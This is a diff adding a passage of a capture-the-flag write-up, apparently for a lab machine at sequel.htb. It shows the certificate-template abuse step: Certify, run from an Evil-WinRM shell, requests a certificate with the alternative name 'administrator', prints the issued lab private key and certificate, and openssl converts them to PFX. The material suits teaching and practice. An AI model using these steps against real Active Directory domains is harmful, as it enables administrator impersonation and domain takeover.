@@ -660,3 +660,102 @@ We're going to cover them all.
 <br />
 
 ### Certify/Rubeus:
+
+<br />
+
+To exploit this, we can continue reading the [README.md](https://github.com/GhostPack/Certify) of Certify, following the scenario 3 steps.
+
+The first step is to request an alternative certificate with the name of `"administrator"`, generating a `cert.pem`:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+...[snip]...
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 14
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvZ0KC7HHgAgSGWl0oUw5p4kiHINgl53kWQH0LACfR7vjuFa5
+05iojEY1Sxh1kZpxdTmbSSSkFZk/2ussf78CPK83XKh5zXCPuL59dlFWtQXdFzKN
+cswquFzwhpthJ/w9fZzXO8bZA/CAanKH8e1/nos5To6BR7bLUVK6T/o84MyT9YsN
+V0WOijUVTfGMtOeCQrZI0zHOJJuNrxAqx+OEtBD/lw3hQy3qhXHHbo0GbsCAu0uU
+0918mAZNEIc4AYYG6TL6veMClU+BFrQKcFhCULn2G0oEuHgZDruGj2yaqS/8Tw7N
+dl4Hrdfbz44SKBEm/JH70B89wvPPkat6n9S4iQIDAQABAoIBABl3V/wOGn9Flji3
+gySOukeYEW7G7lguqpaRvpuSUdIul/0QGNEkda6xV0MIu/GcTpSx8fs24prMBFmA
+sG9P1hsUZVkaf5FqBsOHQg58Cisx6GnPLlQ2u54bTWqmv7vBEvkl8Xpj0I3I5VZm
+n3+MqFFA3aeBWDerg08ez0sijr6aP+2Yz8JKxa4CJmHTbwWGRomKxe9bR+EAG3AJ
+V/EziHqFgGWSyDs0Cgwm3eS7/By+xwCrfRsAgIGkCYPlEZ3cet0NPNRgazYGKUK4
+TFVqTpas7Pkr10XQShaAlZLIEyM2BsKxPTQ4LxEBPMcwarIHxBHgRP6cIc3PdkVD
++BT0yakCgYEAyNftD58jPubh8MyYJmxiduECEoHkjMc1OGJJxSSe3IoI9Lxe6zCR
+74E/mcv7zhkR7/TbziG2JoJ3agE2HoLL/oxzvbvqazRD8eGaZH7ufGy2rLZosErX
+sL6SJ44bxb8ZG8k4vWs/3EDz8SjCazMojICTQWN25RaHJ/S4MEKwVX8CgYEA8a+Z
+TFTEQNcob3w8WUioD2aNUAY6mv6V2B3tMjNs3Fb/DsdHbUK09Oczkq979sHoZHd8
+z/0WExHgslEHw2DiJd4NiWTwDXLOCa9TQz0/E7/2YivLCc7WzEgsRv/89HZqlR2K
+Nr3Fe7i7unm8/z5ctH8CisI/v0jcc9Jme7jZRfcCgYAW+BLFcZavT+pRBqTz5/tO
+yybYhQBlVTbx7tOu9yQv5p1ll9FnJlPaRzbF2P1AMb/KaH9m0JYrS0pq1h6hWKYJ
+w3hNH5uMjRqkI//rNFUD587wa6AHYVfPf8vpOChW8ibl9ZpGl2hjQQ5k6xto9R3T
+C7VLihuD0ZK9cBBMfKP78wKBgGgu9RtVcyAsX67nVDB8xI2W/JWhicPkuP1nsScx
+ydyV1+8r8ltkJRNpUu8JnJt7bU1ZwMD77Xcc/sp/aaRMcFA4j4dJrr1tXuoH3RGg
+Jj/CQViCXk0FD80R05xrn0RWg41yJXGBjs7NjIdPESzKWjYohhUAtXAk3XtEGI9+
+2JJzAoGAI3KNUjiIJgi1ItRXPjVaynrHxstqcjqz90ii6LS4FYsg1cVvRwNquEG4
+8ULxRsGb3v5k0hN5mhdtFu4TDVX9ZrBHu57S0d1cZYLMV/FkvMdUkgrcGv55ObFP
+W/ry9u7vtRfDoUV7Dz9kBwMg36LaQjQ3hYhvpodCHvXUWnhwC5s=
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAA40+bBZUvmKfwAAAAAADjANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwNTA0MTc0MTU5WhcNMzUwNTAy
+MTc0MTU5WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9nQoLsceACBIZaXShTDmniSIc
+g2CXneRZAfQsAJ9Hu+O4VrnTmKiMRjVLGHWRmnF1OZtJJKQVmT/a6yx/vwI8rzdc
+qHnNcI+4vn12UVa1Bd0XMo1yzCq4XPCGm2En/D19nNc7xtkD8IBqcofx7X+eizlO
+joFHtstRUrpP+jzgzJP1iw1XRY6KNRVN8Yy054JCtkjTMc4km42vECrH44S0EP+X
+DeFDLeqFccdujQZuwIC7S5TT3XyYBk0QhzgBhgbpMvq94wKVT4EWtApwWEJQufYb
+SgS4eBkOu4aPbJqpL/xPDs12Xget19vPjhIoESb8kfvQHz3C88+Rq3qf1LiJAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFENxayoMC/58q2Ek8/g6GbzVpPQX
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEAeuaDXsTUKZUiAhYBCNSTwRlRKocEEsoWz7VbbMHhe4tXPg9nSwXNH8gA
+lUPs2agbt3qtJgUyUR0qI4bnyLo6BzX3IRCvjfvN7ENlOlIaE+tOrw8akWkxMwc/
+QT6Fbv7/IATDjXe0nOm7VUm9maE571gfnb57451wSb6j+FuA+zxmtblflezz2DHI
+CWOznRXOeYCXlPVoAoA1uvr4zaAnBcWdmdLgX1zv7uhIbxRD1s5+EIFSDDyBZjsK
+langBG/tIYP8dVcBt8kY0/3ob78OlEYUrs4oSifQAtxpvX29yk/QqmXoT610/Vbt
+Pvj3Kg2e7YKZAECtDCR9N5Ji5p7sQA==
+-----END CERTIFICATE-----
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+<br />
+
+Once we have this output, we need to copy the keys into a `cert.pem` file on our local machine and use the `openssl` command to convert it to `cert.pfx`:
+
+<br />
+
+```bash
+❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+❯ ls
+󰌆 cert.pem   cert.pfx
+```
+
+<br />
+
